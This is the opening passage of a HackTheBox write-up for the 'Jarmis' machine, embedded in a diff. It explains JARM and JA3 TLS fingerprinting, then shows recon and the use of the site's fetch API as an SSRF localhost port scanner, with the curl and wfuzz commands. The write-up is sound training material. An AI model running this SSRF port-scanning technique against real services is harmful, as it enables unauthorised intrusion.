@@ -1,0 +1,1112 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Jarmis</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-jarmis">htb-jarmis</a> <a class="post-tag" href="/tags#ja3">ja3</a> <a class="post-tag" href="/tags#ja3s">ja3s</a> <a class="post-tag" href="/tags#jarm">jarm</a> <a class="post-tag" href="/tags#tls">tls</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#vhosts">vhosts</a> <a class="post-tag" href="/tags#ncat">ncat</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#fastapi">fastapi</a> <a class="post-tag" href="/tags#ssrf">ssrf</a> <a class="post-tag" href="/tags#wfuzz">wfuzz</a> <a class="post-tag" href="/tags#jq">jq</a> <a class="post-tag" href="/tags#metasploit">metasploit</a> <a class="post-tag" href="/tags#msf-custom-module">msf-custom-module</a> <a class="post-tag" href="/tags#iptables">iptables</a> <a class="post-tag" href="/tags#omigod">omigod</a> <a class="post-tag" href="/tags#cve-2021-38647">cve-2021-38647</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#flask">flask</a> <a class="post-tag" href="/tags#gopher">gopher</a> <a class="post-tag" href="/tags#code-review">code-review</a> <a class="post-tag" href="/tags#htb-laser">htb-laser</a> <a class="post-tag" href="/tags#htb-travel">htb-travel</a> <a class="post-tag" href="/tags#uhc">uhc</a> </span><br/><br/>
+<time class="dt-published" datetime="2021-09-27T09:00:00+00:00" itemprop="datePublished">Sep 27, 2021
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2021/09/27/htb-jarmis.html" style="color: #e6e6e6; text-decoration: none;">HTB: Jarmis</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/jarmis-cover.webp" type="image/webp"/>
+<img alt="Jarmis" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/jarmis-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>My favorite part about Jarmis was that it is centered around this really neat technology used to fingerprint and      identify TLS servers. There’s an application that will scan a given server and report back the Jarm signature, and if that signature matches something potentially malicious in the database, it will do a GET request to that server to    collect additional metadata. I’ll abuse that service to get a list of open ports on localhost and find 5985/5986, which are typically WinRM. Given that Jarmis is a Linux host, it’s odd, and it turns out that this is the same port   that OMI listens to, and the host is vulnerable to OMIGod. To exploit this, I’ll find a POC and convert it into a     Gopher redirect by redirecting the GET request. I’ll need to create a malicious server as well, and I’ll show two ways, using IPTables and a custom Metasploit module. In Beyond Root, I’ll look at the webserver config, and find the  error in the public Jarm code that allowed me to use Jarm as a port scanner.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/389 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/jarmis" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Jarmis</a> <a href="https://hackthebox.com/machines/jarmis" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-jarmis.webp" type="image/webp"/> <img alt="Jarmis" class="img-av" src="/icons/box-jarmis.png"/></picture></a><br/><a href="https://hackthebox.com/machines/jarmis" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right">27 Sep 2021</td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">27 Sep 2021</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/3769" rel="noopener" target="_blank"><img alt="ippsec" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/3769" style="display: unset"/><span class="user-text" style="display: none"> ippsec</span></a><br/> <a href="https://app.hackthebox.com/users/1471" rel="noopener" target="_blank"><img alt="waldo" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/1471" style="display: unset"/><span class="user-text" style="display: none"> waldo</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="background---jarm">Background - JARM</h2>
+<p>Jarmis is built around an API in front of a database of JARM fingerprints. Before going into the box, it’s worth understanding what JARMs (and JA3 and JA3S fingerprints) are.</p>
+<h3 id="ja3">JA3</h3>
+<p>In early 2019, some researchers at Saleforce announced <a href="https://github.com/salesforce/ja3">JA3 fingerprints</a> as a way of fingerprinting TLS clients. When I client starts a TLS connection, first it establishes a TCP connection (full three-way handshake), and then it starts a TLS handshake. The TLS handshake offers the TLS version, the list of accepted ciphers, list of extensions, elliptic curves, and elliptic curve formats for the client. It turns out that different clients have different settings here, and the JA3 takes all the information and outputs it as a single string that looks like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>769,47-53-5-10-49161-49162-49171-49172-50-56-19-4,0-10-11,23-24-25,0
+</code></pre></div></div>
+<p>This is not a hash, as the values can be decoded back to a full understanding of the connection. They do offer also a 32-character version of the JA3, which is just the MD5 hash of that string above, used for easier comparisons.</p>
+<p>These fingerprints can be calculated completely passively just by watching the TLS handshake, either in real-time or in a PCAP. JA3 signatures have has some success in identifying different families of malware and separating them from legit clients (like Firefox). The ability to collect JA3 signatures is now available in all kinds of network monitoring, including Zeek (formerly Bro) and Surricata.</p>
+<h3 id="ja3s">JA3S</h3>
+<p>At the same time that they announced JA3, they also announced JA3S, which is a similar fingerprint but for the server. The challenges that come up with JA3S are:</p>
+<ul>
+<li>There are far fewer values that the server responds with. Where the client sends all the ciphers it supports, the server just sends back the one it wants to use. Fewer values means that the fingerprints are less specific, and therefore less useful.</li>
+<li>The server response will depend on the client packet. The same server may tell one client to use cipher A, but the next client to use B when that client didn’t offer A.</li>
+</ul>
+<p>The resulting fingerprint only has three values:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SSLVersion,Cipher,SSLExtension
+</code></pre></div></div>
+<h3 id="jarm">JARM</h3>
+<p>In late 2020, the same researchers <a href="https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a">announced JARMs</a>, which attempt to improve on server fingerprinting. JARMs are based on an active scan of the server, where the scanner will start ten different connections to the server, and record each of them to help identify how it responds uniquely.</p>
+<p>Looking at the format of a JARM fingerprint, it is a fuzzy hash:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2ad2ad0002ad2ad00042d42d00000069d641f34fe76acdc05c40262f8815e5
+</code></pre></div></div>
+<p>The first 30 characters are the TLS version chosen by the server for each of the ten client hello messages the scanner sent it. The back 32 characters are a truncated SHA256 hash of the cumulative extension sent by the server.</p>
+<p>For the ten connections made to get a JARM, the TCP connection is killed after the TLS server responds with it’s Hello message, as all the necessary info is collected at that point. So the server never get an actual request for any content.</p>
+<p>Shodan, the most famous internet scanner, has included JARM fingerprints since <a href="https://twitter.com/shodanhq/status/1328911823006035970?lang=en">around their release</a>.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.117
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 15:46 EDT
+...[snip]...
+Nmap scan report for jarmis.htb (10.10.11.117)
+Host is up (0.11s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 98.77 seconds
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.117
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 15:48 EDT
+Nmap scan report for jarmis.htb (10.10.11.117)
+Host is up (0.10s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
+|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
+|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Jarmis
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.34 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH version</a>, the host is likely running Ubuntu 20.04 Focal.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>Trying to visit <code class="language-plaintext highlighter-rouge">http://10.10.11.117</code> just hangs at “Loading…”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210922155128083.webp" type="image/webp"/>
+<img alt="image-20210922155128083" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210922155128083.png"/>
+</picture>
+<p>Looking in Burp, the GET to <code class="language-plaintext highlighter-rouge">/</code> is followed by four more GETs, one of which is to <code class="language-plaintext highlighter-rouge">http://jarmis.htb</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210922155231243.webp" type="image/webp"/>
+<img alt="image-20210922155231243" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210922155231243.png"/>
+</picture>
+<p>I’ll add <code class="language-plaintext highlighter-rouge">jarmis.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, and then visit that. It loads a Jarmis Search Engine:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210922155406944.webp" type="image/webp"/>
+<img alt="image-20210922155406944" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210922155406944.png"/>
+</picture>
+<p>A JARM signature is a way of identifying different TLS servers.</p>
+<p>The dropdown has three available searches:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210922155459412.webp" type="image/webp"/>
+<img alt="image-20210922155459412" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210922155459412.png"/>
+</picture>
+<p>Giving it a random id, like 5, returns JSON:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210922155523515.webp" type="image/webp"/>
+<img alt="image-20210922155523515" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210922155523515.png"/>
+</picture>
+<p>I can put that <code class="language-plaintext highlighter-rouge">sig</code> value into the “Search Signature” option and get the same result.</p>
+<p>For “Fetch Jarm”, it doesn’t say what to enter besides “string”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210922155838390.webp" type="image/webp"/>
+<img alt="image-20210922155838390" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210922155838390.png"/>
+</picture>
+<p>Still, I can guess it takes a URL. I’ll give it <code class="language-plaintext highlighter-rouge">https://10.10.14.6</code> , and want some way to see if traffic reaches me. <code class="language-plaintext highlighter-rouge">python -m http.server</code> doesn’t support TLS. I’ll use <code class="language-plaintext highlighter-rouge">ncat</code> to start. <code class="language-plaintext highlighter-rouge">ncat</code> actually installs itself over <code class="language-plaintext highlighter-rouge">nc</code> (<code class="language-plaintext highlighter-rouge">apt install ncat</code>), as it just offers a superset of what <code class="language-plaintext highlighter-rouge">nc</code> traditionally has. It includes the <code class="language-plaintext highlighter-rouge">--ssl</code> option:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">--ssl</span> <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 0010 406C A496 2691 BA82 388F CAEF 1C82 F2B2 C9C2
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+</span></code></pre></div></div>
+<p>On feeding it my URL, there’s a connection and it closes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">--ssl</span> <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 0010 406C A496 2691 BA82 388F CAEF 1C82 F2B2 C9C2
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:36734.
+Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
+</span></code></pre></div></div>
+<p>A few seconds later the page returns:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"sig"</span><span class="p">:</span><span class="w"> </span><span class="s2">"21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"ismalicious"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"endpoint"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.10.14.6:443"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"note"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.10.14.6"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"server"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>JARMs are calculated based on 10 different TLS connection attempts, but only the first one is responded to here. My gut is that the JARM code should not return a signature if the server stops allowing even a TCP connection, but the public code actually just puts <code class="language-plaintext highlighter-rouge">000</code> for that connection, which explains all the 0s in the <code class="language-plaintext highlighter-rouge">sig</code> above.</p>
+<p>If I run <code class="language-plaintext highlighter-rouge">ncat</code> with <code class="language-plaintext highlighter-rouge">-k</code> to allow multiple connections, I can see all 10:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">--ssl</span> <span class="nt">-lnvkp</span> 443
+<span class="go">Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 1FBB 1281 6D10 158E 1FD0 CFA4 9FBA 9AC6 0AEA 6A5E
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:36758.
+Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:36760.
+Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:36762.
+Ncat: Failed SSL connection from 10.10.11.117: error:1417A0C1:SSL routines:tls_post_process_client_hello:no shared cipher
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:36764.
+Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:36766.
+Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:36768.
+Ncat: Failed SSL connection from 10.10.11.117: error:14209102:SSL routines:tls_early_post_process_client_hello:unsupported protocol
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:36770.
+Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:36772.
+Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:36774.
+Ncat: Failed SSL connection from 10.10.11.117: error:142090C1:SSL routines:tls_early_post_process_client_hello:no shared cipher
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:36776.
+Ncat: Failed SSL connection from 10.10.11.117: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share
+</span></code></pre></div></div>
+<p>Interestingly, the JSON is shorter here:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"sig"</span><span class="p">:</span><span class="w"> </span><span class="s2">"21d19d00021d21d00042d43d000000107066a9db8d16b0a001ff4969166ce7"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"endpoint"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.10.14.6:443"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"note"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.10.14.6"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">ismalicious</code> and <code class="language-plaintext highlighter-rouge">server</code> fields are missing.</p>
+<p>If I search for the JARM of the second one, it’s not in the database, but the first one is.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The site is completely in JavaScript, something like React based on the filenames. The headers just show NGINX.</p>
+<p>When I make requests of the site, I see things like <code class="language-plaintext highlighter-rouge">/api/v1/search/id/5</code> and <code class="language-plaintext highlighter-rouge">/api/v1/fetch?endpoint=https://10.10.14.6</code>. Basically the site is running off local JavaScript, and making requests to the API to get the data and load it in place.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://jarmis.htb
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.3.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://jarmis.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.3.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-yellow">301</span><span class="go">        7l       12w      178c http://jarmis.htb/api
+</span><span class="feroxbuster-green">200</span><span class="go">       31l       63w      967c http://jarmis.htb/docs
+</span><span class="feroxbuster-yellow">301</span><span class="go">        7l       12w      178c http://jarmis.htb/static
+</span><span class="feroxbuster-yellow">301</span><span class="go">        7l       12w      178c http://jarmis.htb/static/css
+</span><span class="feroxbuster-yellow">301</span><span class="go">        7l       12w      178c http://jarmis.htb/static/js
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 1m    149995/149995  0s      </span><span class="feroxbuster-green">found</span><span class="go">:5       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   339/s   http://jarmis.htb
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   336/s   http://jarmis.htb/api
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   340/s   http://jarmis.htb/static
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   338/s   http://jarmis.htb/static/css
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   340/s   http://jarmis.htb/static/js
+</span></code></pre></div></div>
+<p>I noticed <code class="language-plaintext highlighter-rouge">/api</code> above, and could fuzz that.</p>
+<p><code class="language-plaintext highlighter-rouge">/docs</code> is interesting. The rest is likely just static stuff.</p>
+<h4 id="docs">/docs</h4>
+<p>This site gives documentation about the API:</p>
+<div style="max-height: 550px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20210922165959390.png">
+<img alt="image-20210922165959390" src="https://0xdfimages.gitlab.io/img/image-20210922165959390.png" style="clip-path: polygon(0 0, 100% 0, 100% 510px, 49% 540px, 51% 520px, 0 550px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 510px, 49% 540px, 51% 520px, 0 550px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 525px"><a href="https://0xdfimages.gitlab.io/img/image-20210922165959390.png"><i>Click for full image</i></a></div>
+</div>
+<p>The first one takes an ID and returns an JARM, just like I observed on the front page.</p>
+<p><code class="language-plaintext highlighter-rouge">signature</code> takes a string and an optional <code class="language-plaintext highlighter-rouge">max_results</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210922170411414.webp" type="image/webp"/>
+<img alt="image-20210922170411414" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210922170411414.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">fetch</code> gives a bit more information:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210922170122847.webp" type="image/webp"/>
+<img alt="image-20210922170122847" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210922170122847.png"/>
+</picture>
+<p>“grab metadata if malicious” is interesting. That sounds more like a connection, not just handshake and close.</p>
+<h3 id="localhost-tls-port-scan">Localhost TLS Port Scan</h3>
+<p>Using the <code class="language-plaintext highlighter-rouge">fetch</code> endpoint, I can scan the local machine for open ports:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/fetch?endpoint<span class="o">=</span>http://localhost:20
+<span class="go">{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"null","note":"localhost"} 
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/fetch?endpoint<span class="o">=</span>http://localhost:21
+<span class="go">{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"null","note":"localhost"}
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/fetch?endpoint<span class="o">=</span>http://localhost:22
+<span class="go">{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"127.0.0.1:22","note":"localhost"}
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/fetch?endpoint<span class="o">=</span>http://localhost:23
+<span class="go">{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"null","note":"localhost"}
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/fetch?endpoint<span class="o">=</span>http://localhost:80
+<span class="go">{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"127.0.0.1:80","note":"localhost"} 
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/fetch?endpoint<span class="o">=</span>http://localhost:81
+<span class="go">{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"null","note":"localhost"}
+</span></code></pre></div></div>
+<p>It seems like for some reason the site sets <code class="language-plaintext highlighter-rouge">endpoint</code> field if the port is open but not if it’s closed. I got a little bit lucky here because the site only works this way if I scan localhost, not 127.0.0.1:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/fetch?endpoint<span class="o">=</span>http://127.0.0.1:81
+<span class="go">{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"127.0.0.1:81","note":"127.0.0.1"}
+</span></code></pre></div></div>
+<p>A good reminder to try both of them just in case when fuzzing things. I’ll look at why in <a href="#code-review">Beyond Root</a>.</p>
+<p>I’ll try fuzzing with localhost, using <code class="language-plaintext highlighter-rouge">--hs '"endpoint":"null"'</code> to hide results containing that string:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>wfuzz <span class="nt">-z</span> range,1-65535 <span class="nt">--hs</span> <span class="s1">'"endpoint":"null"'</span> <span class="nt">-u</span> http://jarmis.htb/api/v1/fetch?endpoint<span class="o">=</span>http://localhost:FUZZ
+<span class="go">
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:FUZZ
+Total requests: 65535
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000022:   200        0 L      1 W        117 Ch      "22"
+000000080:   200        0 L      1 W        117 Ch      "80"
+000005986:   200        0 L      1 W        119 Ch      "5986"
+000008001:   200        0 L      1 W        119 Ch      "8001"
+000005985:   200        0 L      1 W        119 Ch      "5985"
+000038332:   200        0 L      1 W        120 Ch      "38332"
+000046012:   200        0 L      1 W        120 Ch      "46012"
+
+Total time: 636.1354
+Processed Requests: 65535
+Filtered Requests: 65528
+Requests/sec.: 103.0205
+</span></code></pre></div></div>
+<p>Sometimes when I ran this brute I would get some stray 502 errors back from the server. These are not positive hits, and I could include <code class="language-plaintext highlighter-rouge">--hc 502</code> to clear those as well.</p>
+<p>I knew about 22 and 80 already. The two high ports could be interesting, but I’m immediately interested in 5985 and 5986. These are typically the WinRM ports on Windows. On Linux, they happen to be used by Open Management Interface, or OMI, which is the software exploitable by <a href="https://www.tenable.com/blog/cve-2021-38647-omigod-critical-flaw-leaves-azure-linux-vms-vulnerable-to-remote-code-execution">CVE-2021-38647</a>, or OMIGod.</p>
+<h2 id="identify-ssrf">Identify SSRF</h2>
+<h3 id="download-data">Download Data</h3>
+<h4 id="signature---fail">signature - Fail</h4>
+<p>I had hoped to download a bunch of the database using the signature API.</p>
+<p>Pushing the “Try It Out” button gives the <code class="language-plaintext highlighter-rouge">curl</code> syntax to run:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210922170520988.webp" type="image/webp"/>
+<img alt="image-20210922170520988" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210922170520988.png"/>
+</picture>
+<p>Unfortunately, it requires a full signature:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="s1">'http://jarmis.htb/api/v1/search/signature/?keyword=21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46&amp;max_results=10'</span>
+<span class="go">{"results":[{"id":135,"sig":"21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46","ismalicious":true,"endpoint":"104.24.4.98","note":"Ncat","server":""}]}
+
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="s1">'http://jarmis.htb/api/v1/search/signature/?keyword=2&amp;max_results=10'</span>
+<span class="go">Internal Server Error
+
